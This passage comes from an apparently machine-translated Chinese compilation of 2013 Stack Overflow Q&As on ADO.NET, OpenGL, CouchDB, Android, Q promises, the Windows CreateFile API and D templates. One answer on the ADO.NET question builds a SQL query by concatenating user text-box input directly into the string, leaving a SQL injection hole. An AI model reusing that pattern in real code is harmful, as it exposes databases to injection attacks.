        Dim obj2 = cmd2.ExecuteNonQuery
        Con.Close()
        If obj2 > 0 Then
            MsgBox(obj2)
            Response.Redirect("~\ControlCharts\AddData_Control.aspx")
            Label7_Control.Visible = False
        Else
            MsgBox(obj2)
            Label7_Control.Text = ("You are not authorized to Add Data")
            Label7_Control.Visible = True
        End If
    Catch ex As Exception
        MsgBox(Err.Description) 
```

如您所见，我正在使用 IF 来比较是否找到用户（受影响的 1 行）或未找到用户（受影响的 0 行）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T22:56:54.510

`ExecuteNonQuery`仅用于插入、更新或删除查询。因此，您要么必须`COUNT`在查询中使用和使用，`ExecuteScalar`要么使用`ExecuteReader`和读者的 [`HasRows`](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqldatareader.hasrows.aspx)财产。

```
Using var reader = cmd2.ExecuteReader()
    If reader.HasRows Then
        ' ...
    Else
        ' ...
    End If
End Using 
```

[**执行非查询**](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.executenonquery.aspx)：

> 对于**UPDATE、INSERT 和 DELETE 语句**，返回值是受命令影响的行数。当正在插入或更新的表上存在触发器时，返回值包括受插入或更新操作影响的行数以及受一个或多个触发器影响的行数。**对于所有其他类型的语句，返回值为 -1。**如果发生回滚，则返回值也是 -1。

**更新**：除此之外，您使用的`LIKE`运算符和参数不正确。代替

```
SQL2 = "SELECT * from MicroDB_Users WHERE Users LIKE '+@Usercheck+'"
cmd2.Parameters.AddWithValue("@Usercheck", TextBox1.Text) 
```

使用这种方法

```
SQL2 = "SELECT * from MicroDB_Users WHERE Users LIKE @Usercheck"
cmd2.Parameters.AddWithValue("@Usercheck", string.Format("%{0}%", TextBox1.Text)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:57:56.923

仅当您执行 INSERT、DELETE 和 UPDATE 时才会返回受影响的行数。

> [执行非查询](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.executenonquery.aspx)
> 
> 对于 UPDATE、INSERT 和 DELETE 语句，返回值是受命令影响的行数。当正在插入或更新的表上存在触发器时，返回值包括受插入或更新操作影响的行数以及受一个或多个触发器影响的行数。对于所有其他类型的语句，返回值为 -1。如果发生回滚，则返回值也是 -1。

要获取行数，请使用`SELECT count(*) FROM myTable`

`ExecuteNonQuery`用于不返回行的查询，从它的名称可以明显看出`NonQuery`。

对于返回结果的查询，请改用这些

*   ExecuteReader() - 返回多行时
*   ExecuteScalar() - 当返回一行一列时。在你的情况下，这将是完美的

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T23:00:42.630

当您编写脚本时，行数会受到影响`INSERT` `UPDATE`，`DELETE`而不是`SELECT`.. 使用`SQL2 = "SELECT * from MicroDB_Users WHERE Users LIKE '+@Usercheck+'"`而不是和`cmd2.ExecuteScalar()`

```
SQL2 = "SELECT COUNT(*) from MicroDB_Users WHERE Users LIKE '%" + TextBox1.Text + "%'";
        Dim cmd2 As New SqlCommand(SQL2, Con)
        cmd2.Parameters.AddWithValue("@Usercheck", TextBox1.Text)
        Dim obj2 As Int32 = 0
        obj2 = Convert.ToInt32(cmd2.ExecuteScalar()) 
```

# facebook-likebox - 受密码保护的 Facebook 赞框现在在未登录时显示为空白

> ID：14469565
> 
> 赞同：0
> 
> 时间：2013-01-22T22:53:59.270
> 
> 标签：facebook-likebox

我们注意到从 2013 年 1 月 22 日开始，当用户未登录 Facebook 时，我们的 Facebook 点赞框现在会显示一个空白框。以前，我们的 Facebook 点赞框会显示登录和注册链接以及空白头像图标，当用户点击登录链接时，会出现一个登录框，然后点赞框会尽快正确填充因为用户已经登录。

我们最终没有改变任何东西，我们使用了 html 5 版本。这是我们的 Facebook 赞框所在的网页 URL (http://www.flalottery.com)。任何帮助都会得到帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-28T17:14:11.903

我们不得不在客户站点上关闭该框。更糟糕的是，在 IE 中它显示了一个很大的无法加载页面错误。而且我看不到它是否登录到 Facebook。

此外，如果您在[http://developers.facebook.com/docs/reference/plugins/like-box/](http://developers.facebook.com/docs/reference/plugins/like-box/)上进行测试，将 URL 更改为其他任何内容也会失败。所以即使是facebook似乎也无法让likebox在他们自己的网站上工作:(

# java - Intel和Nvidia之间的OpenGL fbo blitting不一致

> ID：14469569
> 
> 赞同：16
> 
> 时间：2013-01-22T22:54:09.973
> 
> 标签：java, opengl, lwjgl, opengl-3, fbo

我正在将 OpenGL 中的低分辨率场景渲染到帧缓冲区中。然后我打算把这个版本画到整个屏幕上（用 GL_NEAREST 放大）。我使用纹理 blitting (glBlitFramebuffer) 来做到这一点。在我的 Nvidia GPU 上这可以工作，但是在我的 Intel i7 集成显卡上执行完全相同的代码时，目标帧缓冲区上的 y-Position 似乎是错误的（即图像被渲染得太远了）。

glGetError 不返回错误。由于 Nvidia 驱动程序往往非常宽容，我希望我在 OpenGL 规范中遗漏了一个 Nvidia 不关心的小细节。我搜索了互联网和stackoverflow，找不到描述的类似问题。两个驱动程序都报告支持 OpenGL 3.0

我的绘图代码：

```
//setup viewport for small image
glPushAttrib(GL_VIEWPORT_BIT);
glViewport(0, 0, image.getWidth(), image.getHeight());

//bind small framebuffer
glBindFramebuffer(GL_DRAW_FRAMEBUFFER, fbo);
glDrawBuffers(GL_COLOR_ATTACHMENT0);
glClear(GL_COLOR_BUFFER_BIT);

//draw
renderRotatedFull(1);//nothing interesting at all happening here

//reset Viewport
glPopAttrib();

//prepare and execute blitting
glBindFramebuffer(GL_READ_FRAMEBUFFER, fbo);
glReadBuffer(GL_COLOR_ATTACHMENT0);

glBindFramebuffer(GL_DRAW_FRAMEBUFFER, 0);
glDrawBuffers(GL_BACK_LEFT);

glBlitFramebuffer(0, 0, image.getWidth(), image.getHeight(), 0, 0, Game.width,
    Game.height, GL_COLOR_BUFFER_BIT, GL_NEAREST);

glBindFramebuffer(GL_FRAMEBUFFER, 0);

//throws exception if there is an OpenGL error
org.lwjgl.opengl.Util.checkGLError(); 
```

初始化如下：

```
fbo =glGenFramebuffers();
glBindFramebuffer(GL_FRAMEBUFFER, fbo);

rbo = glGenRenderbuffers();
glBindRenderbuffer(GL_RENDERBUFFER, rbo);
glRenderbufferStorage(GL_RENDERBUFFER, GL_RGBA8, image.getWidth(), image.getHeight());
glFramebufferRenderbuffer(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_RENDERBUFFER, rbo);

assert(glCheckFramebufferStatus(GL_FRAMEBUFFER) == GL_FRAMEBUFFER_COMPLETE); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-08T04:46:36.617

这可能是英特尔核芯显卡的已知问题。在这里查看这个程序 - [http://www.realtech-vr.com/glview/download.php](http://www.realtech-vr.com/glview/download.php)

这个程序告诉你你的显卡支持什么版本的OpenGL，有时Intel HD只支持1.1（我知道很奇怪！）但有时它可以说它支持更高但有错误。

祝你好运！

# couchdb - couchDB 中的 JSON 格式列表

> ID：14469576
> 
> 赞同：1
> 
> 时间：2013-01-22T22:54:44.553
> 
> 标签：couchdb

我正在为 couchDB 写一个列表。我读过的所有文档都假设您希望以 html 或纯文本形式返回数据。但是，我需要它以 JSON 格式返回，与视图返回的方式完全相同（我正在编写的应用程序依赖于此）。

让列表以 JSON 格式返回其数据的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-23T00:20:04.700

尝试[toJSON()](http://couchdb.readthedocs.org/en/latest/query-server/javascript.html#toJSON)，参见[示例](http://couchdb.readthedocs.org/en/latest/query-server/javascript.html#getRow)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T16:37:36.980

您需要格式化输出`send`以模仿 JSON 输出。以下是我们在真实案例中如何做到这一点的示例：

```
function(head, req) {
    start({"headers": {"Content-Type": "application/json"}});
    var keys = {};
    while (row = getRow()) {

    //Code goes here

    send("{\"rows\":[");
    var init = true;
    for (var key in keys) {
        if (init) {
            send("\n");
            init = false;
        }
        else send(",\n");
        send("{\"key\": " + key + ",\"value\":");
        send("{\"first_val\":" + val1);
        send(", \"second_val\":" + val2);
        send(", \"third_val\":" + val3 + "}}");
    }
    send("\n]}");
} 
```

这样，列表的输出与底层视图具有相同的格式。

# box-api - 如何取消上传或下载

> ID：14469577
> 
> 赞同：0
> 
> 时间：2013-01-22T22:54:53.507
> 
> 标签：box-api

我有一个允许用户取消文件上传/下载操作的 UI，但我找不到告诉 Box 取消的方法。

我错过了什么？

谢谢，皮特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-09T14:00:22.800

只是想出了一个方法来做到这一点。调用上传方法前使用**[Box registerObserverForUploadQueue] ，实现BoxObserver方法****uploadDidRegisterForItem:(UploadID *)uploadID**

然后您可以记录与上传相关联的uploadID 并取消。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T17:43:35.100

这是您要在客户端处理的事情。

最简单的方法可能是在用户取消 UI 中的操作时终止与上传或下载相关的 HTTP 连接并清理任何相关资源。（很明显，你如何做到这一点会因编程语言而异）

# android - 如何在android中添加日期选择器

> ID：14469580
> 
> 赞同：0
> 
> 时间：2013-01-22T22:55:01.253
> 
> 标签：android, datepicker

我正在尝试在 android 应用程序中添加日期选择器。当我拖放日期选择器错误时，屏幕上会显示。错误是 -

“找不到以下类：-CalendarView（更改为 android.widget.CalendarView，修复构建路径，编辑 XML）-DatePicker（更改为 android.widget.DatePicker，修复构建路径，编辑 XML）”

以下是 datepicker 的 xml 代码 -

```
<DatePicker
        android:id="@+id/datePicker1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_x="83dp"
        android:layout_y="72dp" /> 
```

我是安卓新手。请帮忙。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-22T23:43:48.350

您可能正在 Android Target 16 或更高版本上预览屏幕。尝试将 Android Target 15 用于图形布局编辑器（顶部的 android 图标，在 ADT 20 中）。看起来 Android Target 16 有问题。

您无需将项目目标设置为`graphical layout editor`.

# xml - 在 F# 中将 xml 节点映射到用户定义的数据类型

> ID：14469587
> 
> 赞同：1
> 
> 时间：2013-01-22T22:55:34.980
> 
> 标签：xml, macros, f#

尝试将 XML 文件（例如销售记录列表）转换为 F# 中的 type_sales 列表。但我不想写类似： xmlnode.product = typesales.product xmlnode.price = typesales.price ...等

我想要一些只需要（“产品”，“价格”，...等）并进行映射的代码，类似于 lisp 宏

我可以在 f# 中执行此操作吗？

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

感谢 KVB 提供链接。对 F# 来说非常新，当我在 F# 中使用这个 XML 文件时弹出了这个问题，但现在我认为我的一般问题是：F# 在 lisp 中有类似宏的东西吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-11-03T10:41:54.263

有一个可能有用的 F# XML 类型提供程序：

[http://fsharp.github.io/FSharp.Data/library/XmlProvider.html](http://fsharp.github.io/FSharp.Data/library/XmlProvider.html)

在编译时给定一个 XML 文件，它将生成以静态类型方式访问文档所需的类型。

```
type Author = XmlProvider<"""<author name="Paul Feyerabend" born="1924" />""">
let sample = Author.Parse("""<author name="Karl Popper" born="1902" />""")

printfn "%s (%d)" sample.Name sample.Born 
```

# android - android如何在listview中未选中复选框时隐藏线性布局

> ID：14469590
> 
> 赞同：1
> 
> 时间：2013-01-22T22:55:43.920
> 
> 标签：android, android-layout

我有一个带有 listview 的布局，在它下面有一个带有两个按钮的线性布局，我希望在没有选中复选框时隐藏两个按钮，我尝试让它隐藏，但是我的代码使两个按钮隐藏并且黑色而不是它们出现，当一个checkbos被选中时，两个按钮没有出现，为什么？

```
class RestaurantAdapter extends BaseAdapter {
    private ArrayList<Boolean> status = new ArrayList<Boolean>();
    private static LayoutInflater inflater = null;
    private ArrayList<HashMap<String, String>> data;
    Activity activity;
    LinearLayout layout;
public RestaurantAdapter(Activity activity,
        ArrayList<HashMap<String, String>> data, LinearLayout layout) {
    this.layout = layout;
    this.activity = activity;
    this.data = data;
    inflater = (LayoutInflater) activity
            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    for (int i = 0; i < data.size(); i++) {
        status.add(false);
    }
}
public int getCount() {
    return data.size();
}
public Object getItem(int position) {
    return position;
}
public long getItemId(int position) {
    return position;
}
public View getView(final int position, View convertView, ViewGroup parent) {
    View vi = convertView;
    if (vi == null)
        vi = inflater.inflate(R.layout.restaurant_multi_select_list_item,
                null);
    TextView name = (TextView) vi
            .findViewById(R.id.restaurant_multi_select_title);
    ImageView image = (ImageView) vi
            .findViewById(R.id.restaurant_multi_select_list_item_image);
    CheckBox cb = (CheckBox) vi
            .findViewById(R.id.restaurant_multi_select_checkBox);
    cb.setOnCheckedChangeListener(new OnCheckedChangeListener() {
        public void onCheckedChanged(CompoundButton buttonView,
                boolean isChecked) {
            if (isChecked) {
                status.set(position, true);
            } else {
                status.set(position, false);
            }
        }
    });
    cb.setChecked(status.get(position));
    boolean allFalse = true;
    int j = 0;
    while (j < status.size() && allFalse) {
        if (status.get(j))
            allFalse = false;
        j++;
    }
    if (allFalse)
        layout.setVisibility(LinearLayout.INVISIBLE);
    else
        layout.setVisibility(LinearLayout.VISIBLE);

    HashMap<String, String> restaurant = data.get(position);
    name.setText(restaurant.get("name"));

    image.setImageResource(Integer.parseInt(restaurant.get("image")));
    return vi;
} 
```

} 检查`allFalse`变量

在主要活动中

```
layout = (LinearLayout) findViewById(R.id.llButtons);

        lvRestaurants = (ListView) findViewById(R.id.lvRestaurants);

        ArrayList<HashMap<String, String>> alist = new ArrayList<HashMap<String, String>>();
        for (int i = 0; i < restaurants.length; i++) {
            HashMap<String, String> hm = new HashMap<String, String>();
            hm.put("image", R.drawable.mcdonalds + "");
            hm.put("name", restaurants[i]);
            alist.add(hm);
        }
        RestaurantAdapter ra = new RestaurantAdapter(this, alist, layout);
        lvRestaurants.setAdapter(ra); 
```

这是xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <ListView
        android:id="@+id/lvRestaurants"
        android:layout_weight="1"
        android:layout_width="fill_parent"
        android:layout_height="0dip" >
    </ListView>

    <LinearLayout
        android:id="@+id/llButtons"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"

        android:orientation="horizontal" >

        <Button
            android:id="@+id/bDone"
            android:layout_width="153dp"
            android:layout_height="match_parent"
            android:text="Done" />

        <Button
            android:id="@+id/bCancel"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:text="Cancel" />
    </LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T23:06:29.467

用于`setVisibility(View.GONE)`使按钮不仅被隐藏，而且停止占用布局中的空间，如果这就是您所说的“出现黑色而不是它们”的意思。

至于它们在检查时不会重新出现，您需要在`status`对象上添加一个侦听器或调用`ra.notifyDataSetChanged()`以重新绘制列表视图（这将导致 onDraw() 逻辑被执行）。

编辑：您可能最容易在适配器之外声明您的 onCheckedChangeListener 并使用它。使用整数记录选中框的数量。

```
private int checkedBoxs = 0;
private final CheckBox.OnCheckedChangeListener listener = 
    new OnCheckedChangeListener() {
        public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
            if (isChecked) {
                status.set(position, true);
                checkedBoxs++;
                if (layout.getVisibility() == View.GONE)
                    layout.setVisibility(View.VISIBLE);
            } else {
                status.set(position, false);
                checkedBoxs--;
                if (checkedBoxs == 0)
                    layout.setVisibility(View.GONE);
            }
        }
    }; 
```

然后`cb.setOnCheckedChangeListener(listener)`在你的 onDraw() 中做。从您的 onDraw() 中消除所有其他 allFalse 逻辑

# java - 在 Selenium 中测试 GWT SimplePager ImageButton 启用状态

> ID：14469593
> 
> 赞同：6
> 
> 时间：2013-01-22T22:55:49.567
> 
> 标签：java, selenium, selenium-webdriver, gwt

我们使用提供的 GWT`SimplePager`通过数据集提供记录/页面导航。我们想测试我们是否正确控制了 Next/Previous 按钮的启用状态。虽然 SimplePager 允许我们为按钮指定启用/禁用的图像，但“按钮”本身是一个内部类，`ImageButton`它扩展`Image`而不是 Button。因此，生成的 HTML 不使用 Button 启用/禁用属性，而是为每个状态提供不同的嵌入图像。

是否有任何合理的方法来检测 Selenium 中的 SimplePager 导航按钮启用状态？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-13T10:29:06.980

查看 SimplePager 的源代码，看起来他们使用生成器来创建 css 样式，其中禁用状态（和启用状态）应用了一个 css 类（我离开了这个[https://code.google .com/p/google-web-toolkit/source/browse/trunk/user/src/com/google/gwt/user/cellview/client/SimplePager.java?r=9614](https://code.google.com/p/google-web-toolkit/source/browse/trunk/user/src/com/google/gwt/user/cellview/client/SimplePager.java?r=9614)）。

因此，如果您能够以某种方式访问​​实际的`Resources`客户端捆绑包，那么您可以调用`resources.simplePagerStyle().disabledButton()`以获取一个字符串，该字符串是禁用按钮的 css 类，然后您可以将其用作 selenium 中的定位器。这可能真的很棘手，因为运行您的 selenium 测试的 jvm 可能无法引用已编译的 GWT 代码（即，当您调试 GWT 应用程序时运行的代码）。

或者，您可以子类`SimplePager`化，而不是使用`DEFAULT_RESOURCES`客户端包，传入您自己的，然后您可以控制用于禁用按钮的类名（通过创建您自己的`Style`类，它只是包装您从原始客户端获得的现有类捆绑，但在返回值中添加前缀或其他内容）。

这有点乱，因为组件被完全封装了，你正试图了解它的内部。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T14:59:48.003

在标准实践中，您应该创建自定义组件，比如说图像按钮。我建议您使用[ISFW](http://seleniumhq.org/about/platforms.jsp#testing-frameworks)，它提供了创建可与注释一起使用的[自定义组件的功能。](http://blog.infostretch.com/isfw-faq#_How_can_I_1)在组件中，您可以根据 AUT 指定行为。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T12:06:30.823

重新编写代码示例以获得更好的格式。

```
public class ImageButton extends Component{
   public ImageButtom (String loc){
    super(locator);
   } 

   @Override
   public boolean isEnabled() {
    //custom representation!...
    return this.getAttribute("class").contains("imgdisabled");
    //return this.getCssValue("background").contains("imgdisabled");
    //return this.getAttribute("src").contains("imgdisabled");
   }
} 
```

您可以在测试页面中使用此组件，例如 Webelement

```
@FindBy(locator="locator")
ImageButton prevButton;

@FindBy(locator="locator")
ImageButton nextButton; 
```

在您的测试代码中

```
page.prevButton.verifyEnabled();
page.prevButton.assertEnabled(); 
```

# javascript - Node.js Q 承诺，既然可以使用 this()，为什么还要使用 defer()？

> ID：14469594
> 
> 赞同：6
> 
> 时间：2013-01-22T22:55:53.183
> 
> 标签：javascript, node.js, callback, deferred, promise

我想做类似的事情：

```
somePromiseFunc(value1)
.then(function(value2, callback) {
    // insert the next then() into this function:
    funcWithCallback(callback);
})
.then(function(dronesYouAreLookingFor){
    // Have a party
})
.done(); 
```

* * *

它没有用。我无法让它工作。我被建议`defer()`用于此目的。

他们[自己的文档](https://github.com/kriskowal/q#using-deferreds)说我们应该为回调风格的函数使用延迟。虽然这很令人困惑，因为他们著名*的扁平化金字塔*示例都是关于回调的，但是这个示例太抽象了，无法理解。

因此，我看到很多人使用`defer`s，这就是我所做的：

```
somePromiseFunc(value1)
.then(function(value2) {
    var promise = q.defer();

    funcWithCallback(function(err, dronesYouAreLookingFor){
        if (!err)
            promise.resolve(dronesYouAreLookingFor);
        else
            promise.reject(new Error(err));
    });
    return promise.promise;
})
.then(function(dronesYouAreLookingFor){
    // Have a party
})
.done(); 
```

* * *

直到我通过检查源代码发现这也有效：

```
somePromiseFunc(value1)
.then(function(value2) {
    return function() {
        funcWithCallback(arguments[1]);
    };
})
.then(function(dronesYouAreLookingFor){
    // Have a party
})
.done(); 
```

为什么我不应该使用这个更简单的无证版本？

未记录，因为虽然这看起来像*扁平化金字塔*所做的那样，`return function(){withCB(arguments[1])}`但`return function(err, cb){withCB(cb)}`实际上不起作用。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-23T16:35:30.100

这不是使用 Promise 库的合法方式。正如Q 旨在遵守[的承诺规范](http://promises-aplus.github.com/promises-spec/)`.then`中详述的那样，您从回调返回的任何不是承诺的东西都应该直接传递。

本质上，基于回调的代码应该被视为`legacy`当您使用 Promise 时。

你有两个基本的选择。如果您多次使用 funcWithCallback ，您可以执行以下操作：

```
var promisedFunc = Q.nfbind(funcWithCallback);

somePromiseFunc(value1)
.then(function(value2) {
    return promisedFunc();
})
.then(function(dronesYouAreLookingFor){
    // Have a party
})
.done(); 
```

或者如果您需要传递参数：

```
var promisedFunc = Q.nfbind(funcWithCallback);

somePromiseFunc(value1)
.then(function(value2) {
    return promisedFunc(value1, value2);
})
.then(function(dronesYouAreLookingFor){
    // Have a party
})
.done(); 
```

如果你只使用一次你可以做

```
somePromiseFunc(value1)
.then(function(value2) {
    return Q.nfcall(funcWithCallback);
})
.then(function(dronesYouAreLookingFor){
    // Have a party
})
.done(); 
```

或者如果您需要传递参数：

```
somePromiseFunc(value1)
.then(function(value2) {
    return Q.nfcall(funcWithCallback, value1, value2);
})
.then(function(dronesYouAreLookingFor){
    // Have a party
})
.done(); 
```

# ruby-on-rails-3 - 我可以在没有自动 ID 列的情况下使 ActiveRecord 运行吗？

> ID：14469601
> 
> 赞同：0
> 
> 时间：2013-01-22T22:56:12.810
> 
> 标签：ruby-on-rails-3, activerecord

我需要在 Rails 3.2 应用程序中有一个树表，它是我正在使用的 API 从另一个站点访问的表的副本。该数据已经存在，并且已经拥有自己的`id`列`parent_id`。我将使用`ancestry`gem 来访问它。

我需要不时使用该数据刷新此表。因此，我希望预定义的`id`列成为 ActiveRecord 目的的 id。除了刷新数据之外，永远不会对该表进行任何插入，只有更新。

我的问题是，我可以简单地`id`将模型中的字段重新定义为这个预定义`id`的，然后让 MySQL 的“id”字段坐在那里吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T13:51:14.593

您可以像这样禁用 id 字段

```
create table :blah, id: false 
```

或者您可以禁用 id 作为主键。

```
create_table :blah, id: false do |t|
  t.integer :id, options: 'PRIMARY KEY'
end 
```

# css - Bootstrap 不会产生偶数跨度

> ID：14469605
> 
> 赞同：0
> 
> 时间：2013-01-22T22:56:59.033
> 
> 标签：css, twitter-bootstrap

我已经从我的页面中删除了所有内容，只是一个指向新引导文件的链接。尽管如此，即使我的跨度加起来为 12，它们在 Firefox 和 chrome 中都显示不同的宽度。世界上可能出了什么问题？

```
<!DOCTYPE html>
<html lang="en">
<head>

    <link href="css/bootstrap.css" type="text/css" rel="stylesheet">

</head>
<body>
    <div class="row-fluid">
        <input type="text" class="span6" placeholder="Pre">
        <input type="text" class="span6" placeholder="Pre">
    </div>  
    <div class="row-fluid">
        <input type="text" class="span6" placeholder="Pre">
        <input type="text" class="span4" placeholder="First Name">
        <input type="text" class="span2" placeholder="Sufix">
    </div>
    <div class="row-fluid">
        <input type="text" class="span4" placeholder="Pre">
        <input type="text" class="span4" placeholder="First Name">
        <input type="text" class="span4" placeholder="Last Name">
    </div>
    <div class="row-fluid">
        <input type="text" class="span2" placeholder="Pre">
        <input type="text" class="span4" placeholder="First Name">
        <input type="text" class="span4" placeholder="Last Name">
        <input type="text" class="span2" placeholder="Sufix">
    </div>
    <div class="row-fluid">
        <input type="text" class="span6" placeholder="Pre">
        <input type="text" class="span6" placeholder="First Name">
    </div>
</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T14:23:08.340

在您的代码中，您使用的是 row-fluid，因此您通常需要使用引导组合 css 或包含引导响应 css。

此外，当在同一行上包含多个网格输入时，您还需要将它们变形`<div class="controls controls-row">`以使填充正常工作。

在我的测试中，我仍然注意到某些屏幕宽度处的奇怪布局亮点。对我来说，当使用非流动行时，我会为您的表单获得最一致的结果。

请参阅[http://jsfiddle.net/panchroma/zhsks/](http://jsfiddle.net/panchroma/zhsks/)这一切都为您工作（非流体行）

有关控件行 div 的更多详细信息，请参阅[http://twitter.github.com/bootstrap/base-css.html#forms](http://twitter.github.com/bootstrap/base-css.html#forms)

祝你好运！

# c - Windows API 的 CreateFile() 中 OPEN_ALWAYS 和 CREATE_ALWAYS 的区别

> ID：14469607
> 
> 赞同：27
> 
> 时间：2013-01-22T22:57:05.927
> 
> 标签：c, windows, createfile

谁能解释创建配置`OPEN_ALWAYS`和Windows API`CREATE_ALWAYS`的[CreateFile()函数之间的区别是什么？](http://msdn.microsoft.com/en-us/library/aa363858%28VS.85%29.aspx)

对我来说，他们似乎都只是“如果文件不存在则创建文件”。

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2013-01-22T22:59:54.043

`CREATE_ALWAYS`如果文件已经存在，也会截断内容。另一方面，`OPEN_ALWAYS`不会破坏已经存在的文件。

以下是不同值以表格形式工作的方式：

```
 |                    When the file...
This argument:           |             Exists            Does not exist
-------------------------+------------------------------------------------------
CREATE_ALWAYS            |            Truncates             Creates
CREATE_NEW         +-----------+        Fails               Creates
OPEN_ALWAYS     ===| does this |===>    Opens               Creates
OPEN_EXISTING      +-----------+        Opens                Fails
TRUNCATE_EXISTING        |            Truncates              Fails 
```

# ios - 用“。”替换双空格的 iOS 键盘快捷键，覆盖我的 UITextfiled 数据

> ID：14469609
> 
> 赞同：0
> 
> 时间：2013-01-22T22:57:19.707
> 
> 标签：ios, keyboard, uitextfield, keyboard-shortcuts

我有一个表格行，它使用 UITextField 输入了一些数据。假设我在“我的数据”中有一些数据，下次当我回到这个活动时，我想编辑它并附加 . 使用双空格键盘快捷键将结果作为“我的数据”。

问题是当我使用双空格快捷方式时，它会覆盖它并将 UITextfield 的值替换为“。”

有什么办法可以附加这个快捷方式。

我希望我能正确解释我的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T17:59:23.720

经过大量挖掘和一些操作后，我得到了以下答案，如果有人遇到同样的问题，这可能会有所帮助。

使用以下委托调用

*   (BOOL) textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string {

并复制以下代码以解决上述问题。

```
//Check for double space, hot key shortcut provided on keyboard.
if((range.location > 0 &&
    [string length] > 0 &&
    [[NSCharacterSet whitespaceCharacterSet] characterIsMember:[string characterAtIndex:0]] &&
    [[NSCharacterSet whitespaceCharacterSet] characterIsMember:[[textField text] characterAtIndex:range.location - 1]])) {

    //Manually replace the space with your own space, programmatically
    NSRange backward = NSMakeRange(range.location - 1, 1);
    textField.text = [rightTextField.text stringByReplacingCharactersInRange:backward withString:@". "];
    return NO;
} 
```

这将附加 . 到 UITextField 中的现有数据。

仍在寻找更好的答案。

# multithreading - Visual C 多线程（请帮助）？

> ID：14469610
> 
> 赞同：0
> 
> 时间：2013-01-22T22:57:36.103
> 
> 标签：multithreading, visual-c++

我编写了一个 .NET 程序，使用 Windows 窗体应用程序。我的应用程序相当简单。基本上，我的表单上有两个简单的按钮。首次加载表单时，我设置了一个全局变量（bool run = true）。

我的第一个按钮本质上是一个非常简单的 while 循环。

`while(run) { // do some code }`

我想要做的是让第二个按钮将布尔值设置为 false（bool run = false）。

但是，一旦我点击了第一个按钮，我什至无法触摸第二个按钮！

我已经阅读了很多关于此的内容，我认为我的解决方案是使用多线程。我在网上找到了一些用于多线程的示例代码，我试图将它们合并，但我不知道为什么我不能让它工作。一旦我单击按钮 #1，我就无法单击按钮 #2。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T15:52:19.177

Your UI thread should not have any infinite or a wait-on-something - never! You must not block the UI for anything (other than simple calculations, validations, user confirmation etc). You should make a thread for performing length task, and let that thread communicate to UI thread using **asynchronous** (or synchronous, if you prefer) communication.

On native Windows GUI application, you can use `PostMessage` (*async*), or `SendMessage` (*sync*). For .NET GUI applications, you can use `Control.BeginInvoke` (*async*), or `Control.Invoke` (*sync*).

Please [read this article](http://www.codeproject.com/Articles/43994/The-Practical-Guide-to-Multithreading-Part-1) on how this is done.

# generics - 字符串（数组）上回文算法的模板冲突

> ID：14469612
> 
> 赞同：2
> 
> 时间：2013-01-22T22:57:43.903
> 
> 标签：generics, d, palindrome, range, dmd

在看过[Andrei Alexandrescu 的 D 的三个不太可能成功的优秀特征之后，](http://www.youtube.com/watch?v=1BRTX86DfOY)我测试了那里给出的回文算法，如下所示

```
import std.exception;

bool isPalindrome(T)(T[] a)
{
  for (; a.length > 1; a = a[1 .. $-1]) {
    if (a[0] != a[$-1]) {
      return false;
    }
  }
  return true;
}

bool isPalindrome(Range)(Range r)
{
  for (; !r.empty; r.popFront(), r.popBack()) {
    if (a.front != a.back) {
      return false;
    }
  }
  return true;
}

unittest {
  enforce(isPalindrome("dallassallad"));
} 
```

数组版本在字符串上运行良好，但是当我将范围版本添加到同一个编译单元 DMD（2.062）时抱怨：

```
palindrome.d(31): Error: template palindrome.isPalindrome matches
more than one template declaration,
palindrome.d(10):isPalindrome(T)(T[] a) and
palindrome.d(20):isPalindrome(Range)(Range r) 
```

我的猜测是限制使用范围不包括数组大小写。我怎么做？

我还测试了删除数组版本，但随后出现错误

```
/home/per/Work/cognia/palindrome.d(22): Error: no property 'empty' for type 'string'
/home/per/Work/cognia/palindrome.d(22): Error: undefined identifier 'popFront'
/home/per/Work/cognia/palindrome.d(22): Error: undefined identifier 'popBack'
/home/per/Work/cognia/palindrome.d(23): Error: undefined identifier a, did you mean variable r?
/home/per/Work/cognia/palindrome.d(23): Error: undefined identifier a, did you mean variable r?
/home/per/Work/cognia/palindrome.d(27): Warning: statement is not reachable
/home/per/Work/cognia/palindrome.d(31): Error: template instance palindrome.isPalindrome!(string) error instantiating 
```

我似乎范围版本不适用于我觉得奇怪的数组。

该怎么办？

* * *

## 回答 #1

> 赞同：6
